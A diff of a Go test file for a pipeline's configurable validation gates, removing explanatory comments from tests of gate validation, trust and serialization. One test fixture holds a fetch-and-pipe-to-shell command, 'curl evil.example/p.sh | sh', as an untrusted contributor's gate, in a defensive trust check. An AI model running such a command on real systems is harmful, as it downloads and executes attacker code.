@@ -44,8 +44,6 @@ func TestValidateGates_RejectsMalformedEntries(t *testing.T) {
 	}
 }
 
-// The delivery tail must stay unanchorable: a gate that ran after push would
-// validate a branch the world can already see.
 func TestValidateGates_RefusesDeliveryTailAnchors(t *testing.T) {
 	for _, anchor := range []types.StepName{types.StepIntent, types.StepPush, types.StepPR, types.StepCI} {
 		if err := validateGates([]Gate{{Name: "g", After: anchor, Command: "x"}}); err == nil {
@@ -74,9 +72,6 @@ func TestValidateGates_RejectsOversizedList(t *testing.T) {
 	}
 }
 
-// A gate defines what validating the pushed branch MEANS, so a contributor's
-// pushed branch must never author one - not even under allow_repo_commands,
-// which only covers a branch re-running its own suite.
 func TestEffectiveRepoConfig_GatesTrustedOnly(t *testing.T) {
 	pushed := &RepoConfig{Gates: []Gate{{Name: "attacker", After: types.StepTest, Command: "curl evil.example/p.sh | sh"}}}
 	trusted := &RepoConfig{Gates: []Gate{{Name: "mutation-budget", After: types.StepTest, Command: "make mutation"}}}
@@ -131,9 +126,6 @@ func TestParseRepoConfig_RejectsMergedAgentGateInstructions(t *testing.T) {
 	}
 }
 
-// A quoted name used to validate trimmed but reach Gate.StepName raw, so the
-// padded spelling landed in step_results, the attestation, and every command
-// an operator has to type. Normalization now happens with validation.
 func TestParseRepoConfig_TrimsGateNameBeforeItBecomesAStepName(t *testing.T) {
 	cfg, err := parseRepoConfig([]byte("gates:\n  - name: \"  arch  \"\n    after: review\n    command: make arch\n"))
 	if err != nil {
@@ -150,8 +142,6 @@ func TestParseRepoConfig_TrimsGateNameBeforeItBecomesAStepName(t *testing.T) {
 	}
 }
 
-// The length bound documents the DERIVED step name, so it has to be applied to
-// the value that actually becomes one.
 func TestValidateGates_TrimmedNameSatisfiesTheLengthBound(t *testing.T) {
 	name := strings.Repeat("x", MaxGateNameLen)
 	gates := []Gate{{Name: "  " + name + "  ", After: types.StepTest, Command: "x"}}
@@ -178,9 +168,6 @@ func TestParseRepoConfig_ParsesGates(t *testing.T) {
 	}
 }
 
-// A run carries its gates for its whole lifetime, so what MarshalGates writes
-// has to come back as the same executable gate list - anchor and command -
-// after a daemon restart.
 func TestMarshalGates_RoundTripsAGateList(t *testing.T) {
 	gates := []Gate{
 		{Name: "mutation-budget", After: types.StepTest, Command: "make mutation"},
@@ -207,8 +194,6 @@ func TestMarshalGates_RoundTripsAGateList(t *testing.T) {
 	}
 }
 
-// An empty list and an absent pin have to be the same thing, so a run that
-// declared no gates reads back exactly like a run written before gates existed.
 func TestMarshalGates_NoGatesEncodesAsNoPin(t *testing.T) {
 	payload, err := MarshalGates(nil)
 	if err != nil {
@@ -226,9 +211,6 @@ func TestMarshalGates_NoGatesEncodesAsNoPin(t *testing.T) {
 	}
 }
 
-// A stored pin is revalidated on the way back in, so a payload this build
-// cannot honor fails its reader instead of quietly running a gate anchored
-// somewhere the pipeline refuses to anchor one.
 func TestParseGates_RejectsAPinThisBuildCannotHonor(t *testing.T) {
 	for _, tc := range []struct{ name, payload string }{
 		{"not json", `{`},
